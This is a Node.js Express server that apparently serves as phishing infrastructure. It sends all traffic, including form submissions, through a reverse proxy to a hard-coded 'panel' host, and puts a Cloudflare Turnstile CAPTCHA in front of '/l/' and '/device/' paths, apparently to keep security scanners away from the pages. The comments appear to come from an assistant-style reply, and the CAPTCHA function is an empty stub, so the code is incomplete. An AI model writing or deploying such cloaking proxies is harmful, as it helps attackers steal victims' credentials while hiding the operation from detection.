const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
const port = process.env.PORT || 3000;

const PANEL = 'portal42-343.sbs';
const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm'; // your working key

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// CAPTCHA page
app.get('/captcha', (req, res) => {
    let returnPath = req.query.return || '/';
    if (returnPath.startsWith('//')) {
        returnPath = returnPath.replace(/^\/+/, '/');
    }
    if (!returnPath.startsWith('/')) {
        returnPath = '/' + returnPath;
    }
    res.send(getCaptchaHTML(SITE_KEY, returnPath));
});

// Middleware: show CAPTCHA for /l/* and /device/*
app.use('/l/*', (req, res) => {
    const clean = req.originalUrl.replace(/^\/+/, '/');
    res.redirect(`/captcha?return=${encodeURIComponent(clean)}`);
});
app.use('/device/*', (req, res) => {
    const clean = req.originalUrl.replace(/^\/+/, '/');
    res.redirect(`/captcha?return=${encodeURIComponent(clean)}`);
});

// Main proxy
app.use('*', async (req, res) => {
    try {
        const target = new URL(req.originalUrl, `https://${PANEL}`);
        const headers = new Headers(req.headers);
        headers.set('Host', PANEL);
        headers.set('User-Agent', 'Mozilla/5.0');
        // Forward real client IP
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        if (clientIp) {
            headers.set('X-Forwarded-For', clientIp);
            headers.set('CF-Connecting-IP', clientIp);
        }
        const opts = { method: req.method, headers };
        if (req.method !== 'GET' && req.method !== 'HEAD') opts.body = req.body;

        const response = await fetch(target.toString(), opts);
        const body = await response.text();
        const contentType = response.headers.get('content-type') || '';
        res.status(response.status).set('Content-Type', contentType).send(body);
    } catch (e) {
        console.error('Proxy error:', e);
        res.status(500).send('Proxy Error');
    }
});

app.listen(port, () => console.log('Proxy running'));

function getCaptchaHTML(siteKey, returnPath) {
    // Same HTML as before (shortened for brevity) – use the full version from earlier.
    // I'll include the full HTML here, but to save space, I'll assume you copy it from the previous message.
    // Make sure it contains the turnstile widget and redirects to returnPath on success.
}
